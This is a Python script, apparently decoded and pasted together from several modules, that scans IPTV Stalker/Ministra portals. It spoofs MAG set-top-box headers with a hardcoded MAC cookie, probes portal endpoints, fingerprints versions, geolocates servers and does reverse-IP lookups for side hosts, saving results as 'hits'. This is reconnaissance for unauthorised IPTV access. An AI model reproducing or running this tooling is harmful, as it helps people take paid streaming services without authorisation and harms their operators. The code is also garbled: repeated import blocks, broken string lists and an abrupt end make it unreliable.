
#---------------------------
# decode by Unnamed         #
import sys, os
import re
import os
import pip
import sys
import zlib
import json
import time
import pathlib
import socket
import hashlib
import base64
import logging
import random
import marshal
import platform
import datetime
import threading
import subprocess
from playsound import playsound
##################
try:
    import urllib
except ModuleNotFoundError:
    pip.main(['install', 'urllib'])
    import urllib

try:
    import flag
except:
    pip.main(['install', 'emoji']) # <-- não seria 'emoji-country-flag' ?
    import emoji

try:
    import requests
except ModuleNotFoundError:
    pip.main(['install', 'requests'])
    import requests

try:
    import sock
except ModuleNotFoundError:
    pip.main(['install', 'requests[socks]'] )
    pip.main(['install', 'sock'] )
    pip.main(['install', 'socks'] )
    pip.main(['install', 'PySocks'] )
    import sock

from requests import get
from datetime import date
from random import uniform
import sys, os
os.system("cls" if os.name == "nt" else "clear")
NOME = 'ULTIMAX-PRO√¹  Flag CHECKER'
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f''']2;{NOME}''')
import requests
import flag
import random
import platform
import os
import time
from datetime import datetime

my_os = platform.system()
if (my_os == "Windows"):
    rootDir = "./"
    my_os = "Wɪɴᴅᴏᴡs"
else:
    rootDir = "/sdcard/"
    my_os = "Aɴᴅʀᴏɪᴅ"
my_cpu = platform.machine()
my_py = platform.python_version()
print("\33[1;32m OS in my system : ", my_os + "\33[0m")

if not os.path.exists(rootDir + 'Hits/'):
    os.mkdir(rootDir + 'Hits/')
if not os.path.exists(rootDir + 'Hits/ULTIMAX/'):
    os.mkdir(rootDir + 'Hits/ULTIMAX/')
if not os.path.isdir(rootDir+'Hits/ULTIMAX/𝚂𝙸𝙳𝙴𝙿𝙾𝚁𝚃𝙰𝙻𝚂/'):
    # Create Directory
    os.mkdir(rootDir+'Hits/ULTIMAX/𝚂𝙸𝙳𝙴𝙿𝙾𝚁𝚃𝙰𝙻𝚂/')
hitsdir=rootDir+'Hits/ULTIMAX/𝚂𝙸𝙳𝙴𝙿𝙾𝚁𝚃𝙰𝙻𝚂/'
if not os.path.exists(hitsdir):
        os.mkdir(hitsdir)

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    import cfscrape
    sesq= requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses= requests.Session()

logging.captureWarnings(True)
os.system("cls" if os.name == "nt" else "clear")


hitc=0
csay=0
PRLM=("""\33[1m\033[48;5;003m\033[38;5;233m              MAC Scanner PRO             
\33[38;5;227m\33[48;5;023m------------------------------------------
    ___    ____  _________       _________
   /   |  / __ \/ ____/   |     / ____<  /
  / /| | / /_/ / __/ / /| |    /___ \ / / 
 / ___ |/ _, _/ /___/ ___ |   ____/ // /  
/_/  |_/_/ |_/_____/_/  |_|  /_____//_/   
------------------------------------------\33[97m
\033[48;5;003m\033[38;5;233mCREW PROJECT               \033[38;5;088mMod by Gabri   \33[0m""")


print(PRLM)


version=1.2
 


("""       \33[1;91m║◌ Sɪᴅᴇ IP / Sᴄᴀɴɴ ◌║ \n""")



def cls():
    os.system('cls' if os.name=='nt' else 'clear')
user_agents_list = [
    'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
    'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)',
    'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1',
    'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01',
    'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0'
    'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; Nautilus/1.0Final) Gecko/20020408',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148'
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 [ip:127.0.0.1:80]'
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 [ip:127.0.0.1:80]'
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
]

HEADERA1 = {
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml + xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
    }    

ses = requests.session()
city1 = ""
scount1 = ""
scode1 = ""
flag1 = ""
http = 'http'
veri12 = ""
data_server1 = ""
country_name1 = ""
token = ""
sip1 = "" 
iport = ""
i = 0

def data_server1(scode1):
    bandera = ''
    pais = ''
    origen = ''
    try:        
        codpais = scode1
        bandera = flag.flag(codpais)
        origen = bandera
    except:
        pass
    return origen

ses = requests.session()
panel=input("\n\33[94m║◌ Hᴏsᴛ/Pᴏʀᴛ:\33[0m\33[0m")

cls()

tags = ['https://', 'http://', '/stalker_portal/c/index.html', '/stalker_portal', '/rmxportal', '/cmdforex', '/portalstb', '/magLoad', '/maglove', '/client', '/portalmega', '/ministra', '/korisnici', '/ghandi_portal', '/magaccess', '/blowportal', '/emu2', '/emu', '/tek', '/Link_OK', '/bs.mag.portal', '/bStream', '/delko', '/portal', '/c/', '/k/', '/k', '/BoSSxxxx/', '/BoSSxxxx', '/powerfull/', '/xx/', '/xx', '/', ' ']
for tag in tags:
    panel = panel.replace(tag, '')

if "http://" in panel or "https://" in panel:
    port=panel.split(":")[1]
    panel=panel.split(':')[0]
    iport=":"+port

fyz=http+"://"+panel+iport

print('\33[94m║◌ Cʜᴇᴄᴋ Sᴛᴀᴛᴜs\33[0m')
try:
    ses.get(str(fyz),headers=HEADERA1, timeout=7, verify=False)
    dgr= '\33[1;32m '+str(fyz).replace('http://','').replace('https://','') +'   ONLINE     \33[0m\n'
    print(dgr)
    time.sleep(3)
except:pass
try:
    headerc={ "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Pragma":"no-cache", "Accept":"*/*" }
    link=""
    link=fyz.replace('http://','').replace('https://','').replace('/c/','').replace('/c','').replace('http://','').replace('/','').replace('\n','')
    url25=""
    url25="https://us.host-tools.com/website-status/"+link+"/http"
    #print(url25)
    res=ses.get(url25,headers=headerc, timeout=15, verify=False)
    veri1=str(res.text).split('<title>')[1].split('</title>')[0]
        
    if 'ONLINE' in veri1:
        renk='\33[1;33m '
        #print('http://'+veri1)
        dgr='\33[1;32m '+str(fyz).replace('http://','').replace('https://','') +'   ONLINE     \33[0m'+ renk +'\n\n Your ip ban Try VPN     \33[0m\n\33[1;31m The Information below\n may not be correct!!!\33[0m\n\n'
        print(dgr)
        time.sleep(3)
    else:
        if 'OFFLINE' in veri1:
            renk='\33[1;31m '
            #print('http://'+veri1)
        else:
            renk='\33[1;31m '
        dgr=renk+str(fyz).replace('\n','') +'   OFFLINE      \33[0m\n'
        #quit()
        print(dgr)
        time.sleep(3)
except:
    renk='\33[1;31m '
    dgr=renk+str(fyz).replace('\n','') +'    OFFLINE     \33[0m\n'
    print(dgr)
    time.sleep(3)

ses = requests.session()
import os

if 'http://' in panel or 'https://' in panel:
    panel = panel.split("://")[1]
    panel = panel.split('/')[0]
panel = panel.replace('/c/', '')
panel = panel.replace('/c', '')
panel = panel.replace('/', '')

def search_panel(url):
    best_result = {"status": "", "url": ""}

    def print_status(status_code, admin):
        status = "\33[92m"
        fx = ""
        if status_code == 200:
            status = "\33[92m [ 200 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 401:
            status = "\33[95m [ 401 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 403:
            status = "\33[91m [ 403 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 512:
            status = "\33[94m [ 512 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 520:
            status = "\33[95m [ 520 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 404:
            status = "\33[31m [ 404 ]\33[0m"
            fx = "\33[1;32m"
        if status_code == 302:
            status = "\33[94m [ 302 ]\33[0m"
            fx = "\33[1;32m"
        print(f"{fx}{status} {admin}\33[0m")
        return status

    payload = [
    '/portal.php',
    '/server/load.php',
    '/stalker_portal/server/load.php',
    '/stalker_u.php',
    '/BoSSxxxx/portal.php',
    '/c/portal.php',
    '/c/server/load.php',
    '/magaccess/portal.php',
    '/portalott.php',
    ]

    
    user_agents_list = [
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3',
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
    'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34',
    'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1',
    'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01',
    'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0'
    ]

    for admin in payload:
        try:
            get_request = requests.get(url + admin, headers={'User-Agent': random.choice(user_agents_list)}, timeout=5)
           #time.sleep(0.5)
            status_code = get_request.status_code
           #time.sleep(0.5)

            result = print_status(status_code, admin)
            if result == "\33[92m [ 200 ]\33[0m" and (best_result["status"] != "\33[92m [ 200 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin
            if result == "\33[95m [ 401 ]\33[0m" and (best_result["status"] != "\33[95m [ 401 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin
            if result == "\33[94m [ 512 ]\33[0m" and (best_result["status"] != "\33[94m [ 512 ]\33[0m" or len(admin) < len(best_result["url"])):
                best_result["status"] = result
                best_result["url"] = admin

        except (requests.ConnectionError, requests.Timeout):
            
            print(f"\33[1;31mNessuna connessione\33[0m PER {admin}")

    if best_result["url"]:
        print(f"\n \33[33mConsigliato per l'analisi  \33[92m({best_result['url']})\33[0m")

while True:
    
    url = ("http://"+panel)
    print("\n")

    search_panel(url)
    break

def data_server1(scode1):
    bandera = ''
    pais = ''
    origen = ''
    try:        
        codpais = scode1
        bandera = flag.flag(codpais)
        origen = bandera
    except:
        pass
    return origen

palma = panel

http="http"
if 'https://' in palma:
    http="https"

tags = ['https://', 'http://', '/stalker_portal/c/index.html', '/stalker_portal', '/rmxportal', '/cmdforex', '/portalstb', '/magLoad', '/maglove', '/client', '/portalmega', '/ministra', '/korisnici', '/ghandi_portal', '/magaccess', '/blowportal', '/emu2', '/emu', '/tek', '/Link_OK', '/bs.mag.portal', '/bStream', '/delko', '/portal', '/c/', '/k/', '/k', '/BoSSxxxx/', '/BoSSxxxx', '/powerfull/', '/xx/', '/xx', '/', ' ']
for tag in tags:
    palma = palma.replace(tag, '')

port=""
iport=""
if ":" in palma:
    port=palma.split(":")[1]
    palma=palma.split(':')[0]
    iport=":"+port

try:
    url25="https://ipleak.net/json/"+palma
    res = ses.get(url25, timeout=(15), verify=False)
    sip1=""
    scountry1=""
    veri1=str(res.text)
    if not 'title' in veri1:
            sip1=veri1.split('ip": "')[1]
            sip1=sip1.split('"')[0]
            scode1=veri1.split('country_code": "')[1]
            scode1=scode1.split('"')[0]
            scount1=veri1.split('country_name": "')[1]
            scount1=scount1.split('"')[0]
            city1=veri1.split('city_name": "')[1]
            city1=city1.split('"')[0]
            flag1=data_server1(scode1)
except:
    pass

if city1=="" or city1==" ":
    city1="𝑵𝑶 𝑰𝑵𝑭𝑶"
if scount1=="":
    scount1="𝑵𝑶 𝑰𝑵𝑭𝑶"
if scode1=="":
    scode1="𝑵𝑶 𝑰𝑵𝑭𝑶"




api = "http://api.hackertarget.com/reverseiplookup/"
x = sip1
ip = {"q":x}
pwn = requests.request("GET", api, headers={'User-Agent': random.choice(user_agents_list)}, params=ip)

#print(pwn.text)

if not 'No DNS A records found' in pwn.text:
    #print('\n Side Host:')
    #hit = ('\n Server IP > ' + sip1 + '\n Srever Country > ' + data_server1(scode1)+'  ' + scount1 + ' Server City > ' + city1 + '\n Side Host:' + '   ' + host_with_port)
    hosts = pwn.text.split('\n')
    host_with_port_list = []    
    for host in hosts:
        host_with_port = '◉ ' + host + iport
        host_with_port_list.append(host_with_port)
        #print('   ' + host_with_port)
    hit = ('╠⍟ Host Check > ' + panel + iport + '\n╠⍟ Server IP > ' + sip1 +   '\n╠⍟ Srever Country > ' + data_server1(scode1) + ' ' + scount1 +   '\n╠⍟ Server City > ' + city1 +   '\n╠⍟ Side Host:\n' +   '\n'.join(host_with_port_list))
    hit = "\n▂▂▂| MAC SCANNER PRO |▂▂▂    \n" + str(hit) + "\n║\n║》»»»» ✬ᴘʏᴛʜᴏɴ-ᴘʏ-ᴄᴏɴғɪɢ✬    🇧🇬" + "\n╚| ✬ℳℴ𝒹𝒹ℯ𝒹 𝒷𝔂 𝒫𝓊𝓈𝒽ℯ𝓀𝒶✬ |"
    print(hit)
    r = input("\n   n PER ANDARE AVANTI ")
    if r == "Y" or r == "y":
        file = open(hitsdir + palma + iport.replace(":",",").replace('/','') + "_" + str(time.strftime('%H:%M:%S').replace(":",",")) + "_" + str(time.strftime('%d %B %Y')) + '@WTFᴅⁿˢ㋡ɪⁿᶠᵒ.txt','a+', encoding = 'utf-8')
        file.write(hit)
        file.close()
    else:
        print("\n Bye Bay     ")
else:
    print("\n No DNS A records found\n Bye Bay      ")

import sys, os
NOME = 'MAC SCANNER PRO FREE CHECKER'
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f''']2;{NOME}''')
import subprocess
import time
import socket  # Importe a biblioteca socket
import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)
urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

ses = requests.session()

useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
BYRimi = "         \x1b[93m          \x1b[0m"
STB = "\x1b[0m\n    \x1b[38;5;94m       \n  \x1b[91m MAC SCANNER PRO  CHECKER    \n\x1b[33m                   \n             \x1b[0m\n"
WARNNING = "\x1b[91m\n\n   █░█░█ ▄▀█ █▀█ █▄░█ █ █▄░█ █▀▀       \n   ▀▄▀▄▀ █▀█ █▀▄ █░▀█ █ █░▀█ █▄█       \n       \x1b[93mPY MODDED BY AreA51  \x1b[0m\n"
liness = [
    " \x1b[91mThis PY is for educational purposes only.",
    " I am not responsible what you do with it!\x1b[0m",
]

def check_server(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)  # Define um tempo limite de conexão de 2 segundos
        result = sock.connect_ex((host, port))
        if result == 0:
            return "Online"
        else:
            return "Offline"
        sock.close()
    except Exception as e:
        return f"Erreur lors de la vérification de l’état du serveur: {str(e)}"

def main():
    print(STB)
    vrdata = ""
    clfe = ""
    clfc = ""
    vrdX = ""
    phpX = ""
    PHPa = ""
    PHPv = ""
    print("          \x1b[32mTYPE IN A PORTAL URL \x1b[0m\n")
    panel = input("\x1b[96m  ◌PortaL \x1b[0m\x1b[31m")
    print("\n\x1b[93m            Please wait...  \x1b[0m")
    print("\x1b[0m")
    if panel == "":
        exit()
    if "http://" in panel or "https://" in panel:
        panel = panel.split("://")[1]
    panel = panel.replace("/c/", "")
    panel = panel.replace("/c", "")
    panels = str(panel)
    if "/stalker_portal" in panel:
        panels = panels.replace("/stalker_portal", "")
        panel = panel.replace("/stalker_portal/", "/stalker_portal")
    if "/rmxportal" in panel:
        panels = panels.replace("/rmxportal", "")
        panel = panel.replace("/rmxportal/", "/rmxportal")
    if "/cmdforex" in panel:
        panels = panels.replace("/cmdforex", "")
        panel = panel.replace("/cmdforex/", "/cmdforex")
    if "/portalstb" in panel:
        panels = panels.replace("/portalstb", "")
        panel = panel.replace("/portalstb/", "/portalstb")
    if "/powerfull" in panel:
        panels = panels.replace("/powerfull", "")
        panel = panel.replace("/powerfull/", "/powerfull")
    if "/magaccess" in panel:
        panels = panels.replace("/magaccess", "")
        panel = panel.replace("/magaccess/", "/magaccess")
    if "/maglove" in panel:
        panels = panels.replace("/maglove", "")
        panel = panel.replace("/maglove/", "/maglove")
    panels = panels.replace(" ", "")
    panel = panel.replace(" ", "")
    datc = ""
    reset = 0

    try:
        res = ""
        spanl = str(panel)
        if ":" in spanl:
            spanl = spanl.split(":")[0]
        if "/" in spanl:
            spanl = spanl.split("/")[0]
            spanl = spanl.replace("/", "")
        urlu = "https://ipleak.net/json/" + str(spanl)
        res = ses.get(urlu, timeout=5, verify=None)
        datc = str(res.text)
    except Exception:
        reset = reset + 1
        time.sleep(1)
        if reset == 3:
            res = ""
            datc = ""

    if 'ip": "' in datc:
        servip = ""
        con = ""
        ip = ""

        try:
            ip = datc.split('ip": "')[1].split('"')[0]
            con = datc.split('country_name": "')[1].split('"')[0]
            con = con.replace("United States of America", "United States").replace(
                "United Kingdom of Great Britain and Northern Ireland", "United Kingdom"
            )
        except Exception:
            pass

        servip = f"""\n\x1b[96m    ● ServIP\x1b[0m ➺  \x1b[93m{ip}\x1b[0m ✔️\n\x1b[96m    ● Country\x1b[0m ➺  \x1b[93m{con}\x1b[0m ✔️"""
    else:
        servip = ""
        res = ""
    HEADERA = {
        "User-Agent": useragent,
        "Referer": "http://" + panel + "/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Host": panels,
        "Cookie": "mac=00%3A1A%3A79%3A01%3ACA%3A35; stb_lang=en; timezone=Europe%2FParis;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG250; Link: Ethernet,WiFi",
    }
    phptitle = ""

    try:
        phptitle = str(
            ses.get("http://" + panel + "/c/", headers=HEADERA, timeout=2, verify=None)
            .text.split("<title>")[1]
            .split("<")[0]
            + "\n"
        )
    except Exception:
        pass

    down = ""
    csp = ""
    cse = ""
    ccf = ""
    cpp = ""
    VPN = ""
    cc = ""
    if "NXT" in phptitle or "c/" in phptitle:
        cc = "NXT c/"
    elif "stalker_portal" in phptitle:
        if "stalker_portal/" in phptitle:
            csp = "stalker_portal/"
        cpp = "server/load.php"
        cse = "\n      ╙➛ \x1b[90m[stalker_portal] \x1b[0m"
    elif "portal" in phptitle or "Portal" in phptitle:
        cpp = "portal.php"
        cse = "\n      ╙➛ \x1b[90m[Portal] \x1b[0m"
    elif "Access denied" in phptitle:
        csp = "❌"
        if "cloudflare" in phptitle:
            ccf = "❌"
        elif "server is down" in phptitle:
            down = "down"
        else:
            cse = phptitle.replace("\n", "")
            cse = "\n      ╙➛ \x1b[90m[" + str(cse) + "] \x1b[0m"
    phpdata = ""

    try:
        phpdata = str(
            ses.get(
                "http://" + panel + "/c/xpcom.common.js",
                headers=HEADERA,
                timeout=2,
                verify=None,
            ).text.replace(" ", "")
        )
        phpd = phpdata
        if "+this.portal_ip+'/" in phpdata:
            phpdata = phpdata.split("portal_ip+'/")[1].split("';")[0]
            if "+this.portal_path+'" in phpdata:
                phpdata = phpdata.split("+'/")[1].split("';")[0]
            phpX = "✔️"
        elif "+this.portal_path+'" in phpd:
            phpdata = phpdata.split("+'/")[1].split("';")[0]
            phpX = "✔️"
        elif "c/portal.php" in phpd:
            phpdata = "c/portal.php"
            phpX = "✔️"
        elif "stalker_portal" in phpd:
            phpdata = csp + "server/load.php"
            phpX = "✔️"
        elif "c/server/load.php" in phpd:
            phpdata = "c/server/load.php"
            phpX = "✔️"
        else:
            phpX = "None"
            if phpd == "":
                phpX = "NoX"
            if "CommonXPCOMSTBconstructor" in phpd:
                phpX = "NoM"
            if "403Forbidden" in phpd:
                phpX = "❌"
            if "404 Not Found" in phpd:
                phpX = "❌"
            if "!DOCTYPE" in phpd:
                VPN = "VPN"
        if "cloudflare" in phpd or ccf == "❌":
            clfe = "\x1b[91m[CloudFlare] \x1b[0m"
        phpdata = phpdata.replace("\n", "")
    except Exception:
        pass

    try:
        vrdata = str(
            ses.get(
                "http://" + panel + "/c/version.js",
                headers=HEADERA,
                timeout=2,
                verify=None,
            ).text.replace(" ", "")
        )
        vrd2 = vrdata
        if "ver='" in vrdata:
            vrdata = vrdata.split("ver='")[1].split("';")[0]
            vrdX = "✔️"
        elif "cloudflare" in vrd2 or not (clfe == ""):
            clfc = " \x1b[91m[CloudFlare] \x1b[0m"
            vrdata = "None"
            vrdX = "❌"
        elif "<!DOCTYPE" in vrd2:
            vrdata = "Down⁉"
            vrdX = "❌"
        else:
            vrdX = "❌"
        if vrdata == "":
            vrdX = "❌"
        vrdata = vrdata.replace("\n", "")
        if vrd2 == "":
            vrdX = "❌"
    except Exception:
        pass

    if "XUI" in vrdata and cpp == "portal.php":
        vrdX = "✔️"
        cc = ""
        if not (phpdata == "") or not (phpdata == " "):
            phpdata = f"""c/{phpdata}"""
        else:
            phpdata = "c/portal.php"
    if "stalker_portal" in phptitle and phpdata == "portal.php":
        vrdX = "✔️"
        cc = ""
        phpdata = "server/load.php"
        cpp = "server/load.php"
    if VPN == "VPN":
        VPN = "\n    ❌ \x1b[31mMaybe your IP is Banned!❌ \n   - Tip = Use VPN and try again.\x1b[0m "
    if phpX == "✔️":
        if "portal.php" in phpdata or "load.php" in phpdata:
            PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m {cc + phpdata} \x1b[0m✔️ {cse}{clfe}"""
            if "portal.php" not in PHPa and cpp == "portal.php":
                PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m {cc + cpp} \x1b[0m✔️ {cse}{clfe}"""
            else:
                PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m {csp + phpdata} \x1b[0m✔️ {cse}{clfe}"""
        elif phpX == "None":
            PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m {csp + cc}server/load.php❗ \x1b[0m{clfe}{VPN}"""
            phpX = "✔️"
        elif phpX == "NoX":
            PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m portal.php or c/portal.php \x1b[0m❗ {clfe}{VPN}"""
            phpX = "✔️"
        elif phpX == "NoM":
            PHPa = f"""\x1b[96m    ● PHP\x1b[0m ➺ \x1b[93m {cc}portal.php \x1b[0m❗ {clfe}{VPN}"""
            phpX = "✔️"
        else:
            PHPa = "    ❌ \x1b[31m ERROR! Server may be Down⁉ \n     Tip = Use VPN and try again. \x1b[0m"
    if vrdX == "✔️":
        PHPv = f"""\x1b[96m    ● Version\x1b[0m ➺ \x1b[93m {vrdata} \x1b[0m✔️{clfc}"""
    else:
        PHPv = f"""\x1b[96m    ● Version\x1b[0m ➺ \x1b[93m None⁉ \x1b[0m❌{clfc}"""
    os.system("cls" if os.name == "nt" else "clear")
    print(STB)
    if down == "down":
        down = "\n        ❌  \x1b[31mServer may be Down⁉\x1b[0m ❌ "
    if phpX == "❌":
        print(
            f"""\x1b[96m    ● Host\x1b[0m ➺ \x1b[93m {panels} \x1b[0m❌ {down}{VPN}{servip}\n"""
        )
        print(PHPa)
    else:
        print("    \x1b[32mPORTAL DATA CHECKED RESULT ARE  \x1b[0m\n\n")
        print(
            f"""\x1b[96m    ● Host\x1b[0m ➺ \x1b[93m {panels} \x1b[0m✔️ {down}{servip}"""
        )
        print(PHPv)
        print(PHPa)
        
    # Verifica o status do servidor e exibe
    host, port = panel.split(":")
    server_status = check_server(host, int(port))
    print(f"\n\x1b[96m    ● Server Status\x1b[0m ➺ \x1b[93m{server_status}\x1b[0m ✔️")
    
    panel2 = input(
        "\n\n"
        + str(BYRimi)
        + "\n      ○ \x1b[31m0 = Check another Portal \x1b[0m\n      ○ \x1b[31mTo EXIT = PRESS ENTER \x1b[0m\n            \x1b[36mAɴsᴡᴇʀ =\x1b[31m "
    )
    print("\x1b[90m")
    if panel2 == "0":
        time.sleep(0.1)

if __name__ == "__main__":
    main() 

os.system("cls" if os.name == "nt" else "clear")



import sys, os
NOME = 'ULTIMAX-PRO√¹  Flag Proxy Scrape'
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f''']2;{NOME}''')
import os,pip
try:
	import requests
except:
	print("requests modulo errors\n")
	pip.main(['install', 'requests'])
	import requests
import random, time, datetime
import subprocess
import json, sys, re
import threading
import os
import platform	
import urllib.request
import os
import pip
import datetime
import os
import socket
import hashlib
import json
import random
import sys
import time
import re
import marshal
import subprocess
import base64
import threading
import codecs
import pathlib

try:
	import requests
except:
	print("requests module is not loaded\nrequests module is being loaded\n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock module is not loaded\ne sock module is being loaded\n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
